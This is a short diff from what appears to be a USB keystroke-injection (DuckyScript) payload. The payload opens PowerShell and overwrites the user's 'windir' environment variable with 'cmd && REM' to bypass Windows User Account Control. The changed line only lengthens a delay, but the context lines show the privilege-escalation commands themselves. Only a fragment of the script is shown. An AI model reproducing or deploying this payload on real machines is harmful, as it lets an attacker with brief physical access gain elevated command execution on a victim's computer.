@@ -12,7 +12,7 @@ Using the Environment Variables to bypass the UAC:
 DELAY 200
 STRING powershell
 ENTER
-DELAY 300
+DELAY 7000
 ALT n
 STRING reg add hkcu\Environment /v windir /d "cmd && REM"
 ENTER
